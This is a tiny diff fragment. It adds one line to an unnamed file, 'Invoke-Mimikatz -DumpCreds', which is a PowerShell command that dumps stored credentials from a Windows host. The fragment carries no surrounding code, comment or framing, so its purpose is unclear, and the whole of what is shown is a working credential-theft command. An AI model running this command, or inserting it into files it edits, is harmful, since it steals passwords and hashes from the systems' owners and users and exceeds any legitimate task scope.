@@ -1,0 +1,1 @@
+Invoke-Mimikatz -DumpCreds
